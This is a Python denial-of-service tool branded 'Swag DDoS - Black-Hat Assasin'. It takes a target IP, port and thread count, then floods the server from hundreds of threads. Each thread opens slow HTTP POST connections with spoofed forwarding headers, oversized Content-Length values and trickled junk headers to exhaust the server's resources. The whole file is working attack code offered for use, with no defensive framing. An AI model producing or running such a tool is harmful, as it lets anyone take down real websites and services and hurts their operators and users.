import socket
import random
import time
import sys
import threading

BLUE = "\033[94m"
CYAN = "\033[96m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"

TOOL_NAME = "Swag DDoS - Black-Hat Assasin"
ACCESS_KEY = "Swag"

ascii_art = f"""{BLUE}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⠾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠻⢶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠞⠋⠀⢠⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠀⠉⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣴⠟⠁⣴⠟⢠⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⢾⣆⠈⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⡾⠃⢠⣾⡏⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⢿⣧⡀⠘⢷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣾⠁⢠⣿⣿⠁⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⠀⢸⣿⣷⡀⠘⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣾⠃⢀⣿⣿⣿⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⢸⣿⣿⣧⠀⠸⣧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⡏⠀⣼⣿⣿⣿⠀⠀⢸⡇⠀⠀⠀⠀⠀⣀⣤⣴⠶⠛⠛⠛⠛⠙⠛⠛⠛⠛⠶⢦⣤⣀⠀⠀⠀⠀⠀⣸⠇⠀⣸⣿⣿⣿⡇⠀⢿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣿⠃⠀⣿⣿⣿⣿⣧⠀⠀⢻⡄⢀⣤⠶⠛⢉⣀⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣤⣄⣀⠉⠛⠶⣤⡀⢠⡟⠀⢀⣿⣿⣿⣿⣷⠀⢸⡇⠀⠀⠀⠀
⣶⣶⣴⡆⣿⠀⠀⣿⣿⣿⣿⣿⣧⡀⠀⠛⠋⢁⣤⣀⣙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣉⣤⣄⡈⠙⠿⠀⢠⣿⣿⣿⣿⣿⣿⠀⢸⡇⠀⣠⠀⠀
⣿⠀⢹⣇⣿⡄⠀⣿⣿⣿⣿⣿⣿⣿⣦⣄⣀⡈⠉⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⠉⢁⣀⣠⣾⣿⣿⣿⣿⣿⣿⡿⠀⢸⣧⣰⠏⠀⡄
⣿⠀⢀⠹⣿⣧⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⢀⣿⣿⠏⠀⢀⡟
⣿⡄⢻⣆⠘⢿⣇⠀⠹⣿⣿⣿⣿⣿⣿⢿⣿⠋⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠻⣿⠟⣹⣿⣿⣿⣿⣿⠋⠀⣼⡿⢃⣴⠟⢸⡇
⢿⡇⠀⣿⣷⣄⠙⢷⣄⠈⠻⢿⣿⡿⠿⠟⠁⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠙⠿⠿⠿⠿⠛⠋⠁⣠⡾⠋⣠⣿⢇⠀⣼⠇
⠈⣿⠀⣿⡟⢿⣷⡀⠉⠓⣤⣤⣤⣤⣤⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣤⣀⣤⣤⡴⠾⢏⣰⣿⠟⣱⡟⢡⡟⠀
⠀⢹⣆⠘⣿⣦⡉⠻⠗⠂⣿⣿⣿⣿⡟⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⢿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⣿⣿⣿⣿⣷⠀⣿⠛⢡⣤⣿⠁⣸⠇⠀
⠀⠀⢿⡄⢻⣿⣧⣶⣤⡀⠙⣿⣿⣿⣥⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⣿⣿⣇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣼⣿⣿⡿⡇⣠⣴⣾⣿⣿⠇⢠⡿⠀⠀
⠀⠀⠈⢷⡈⠻⣿⣿⣿⣿⡆⢸⣿⡿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⡏⠀⢸⣿⣿⣿⡿⠋⢠⡾⠁⠀⠀
⠀⠀⠀⠀⠻⢦⡈⠻⢿⣿⠀⣸⣿⣿⣶⣄⠀⠈⢙⡛⠻⢿⣿⣿⣿⣿⢸⣿⣿⣿⠉⣿⣿⣿⣿⠿⠟⢛⡉⠁⢀⣴⣾⣿⣿⡆⠸⣿⣿⠋⣀⡴⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⣼⣿⣿⣿⣿⣿⣷⣦⡘⠛⠷⠶⠀⠉⠛⣛⢺⣿⣿⣿⠀⠿⠛⠉⠠⠶⠾⠛⣃⣴⣿⣿⣿⣿⣿⣿⡄⠉⣹⡾⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢻⡆⠛⢿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣷⣶⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⣰⡟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣦⠀⠙⢿⣿⡿⠿⠛⢻⣛⣻⣿⣿⣿⣿⡿⣿⣿⣿⣿⡿⣽⣿⣿⣿⣿⣛⣛⠛⠻⠿⣿⣿⡿⠋⢀⣼⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣄⠈⠻⣿⣦⣀⡈⠻⢿⣿⣿⣿⣿⠃⣼⣿⣿⣿⣇⢸⣿⣿⣿⣿⡿⠋⣀⣀⣼⣿⠋⠀⣴⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡄⠀⣿⣿⣿⣿⣄⠈⠻⣿⣿⡏⠸⣿⣿⣿⣿⡿⠀⣿⣿⡿⠋⠀⣴⣿⣿⣿⡇⠀⣸⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⢹⣿⣿⣿⣿⡎⢻⣦⣙⠛⠂⠈⢿⣿⡟⠁⠺⢛⣩⣴⠾⣾⣿⣿⣿⣿⠇⢠⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⣄⡈⠙⢿⣿⣿⡄⢙⡛⠻⣿⢶⡼⠟⠠⢾⡿⠛⢟⠁⣰⣿⣿⠟⠉⢀⣴⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠹⣶⡀⠉⢿⣷⡘⢿⣶⣦⣤⣅⣀⣠⣤⣶⣷⡿⢡⣿⡟⠁⢠⣴⠏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡄⠈⣿⣷⣤⡉⠛⠻⠿⠿⠿⠟⠛⣉⣴⣿⣿⠀⣠⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣄⠉⠻⣿⣿⣷⣶⣶⣿⣶⣶⣿⣿⣾⠟⠁⣠⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠈⢿⣿⣿⣿⣿⣿⣿⣿⠟⠁⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣦⠀⠻⢿⣿⣿⣿⠿⠋⠀⣴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⢶⣤⣤⣤⣤⣤⡴⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{RESET}
"""

print(ascii_art)
print(f"{CYAN}{TOOL_NAME} – PHASE: ABSOLUTE DESTRUCTION{RESET}\n")

if input("Enter Access Key: ").strip() != ACCESS_KEY:
    sys.exit(1)

target_ip = input("Target IP: ").strip()
target_port = int(input("Port: ").strip() or "80")
power_level = int(input("Threads (Recommended 500+): "))

U_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Chrome/94.0.4606.81 Safari/537.36"
]

def get_payload(ip):
    f_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    p_headers = [
        f"POST /?{random.getrandbits(32)} HTTP/1.1",
        f"Host: {ip}",
        f"User-Agent: {random.choice(U_AGENTS)}",
        f"X-Forwarded-For: {f_ip}",
        f"X-Real-IP: {f_ip}",
        f"Content-Length: {random.randint(500000, 2000000)}",
        "Content-Type: application/x-www-form-urlencoded",
        "Connection: keep-alive",
        "Accept: */*",
        "\r\n"
    ]
    return "\r\n".join(p_headers).encode()

def overload_logic(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(2)
            s.connect((ip, port))
            s.send(get_payload(ip))
            for _ in range(10):
                s.send(f"Data-{random.getrandbits(16)}: {random.getrandbits(16)}\r\n".encode())
                time.sleep(random.uniform(0.1, 0.5))
        except:
            pass

def main():
    print(f"\n{RED}[!] ACTIVATING RED-TEAM OVERKILL...{RESET}")
    for i in range(power_level):
        threading.Thread(target=overload_logic, args=(target_ip, target_port), daemon=True).start()
        if i % 100 == 0: print(f"{BLUE}[*] Thread Group {i} Engaged{RESET}")

    print(f"\n{GREEN}[!!!] SERVER IS NOW IN CRITICAL STATE [!!!]{RESET}")
    while True:
        sys.stdout.write(f"\r{RED}POWER: MAX | STATUS: EXHAUSTING RESOURCES{RESET}")
        sys.stdout.flush()
        time.sleep(1)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit()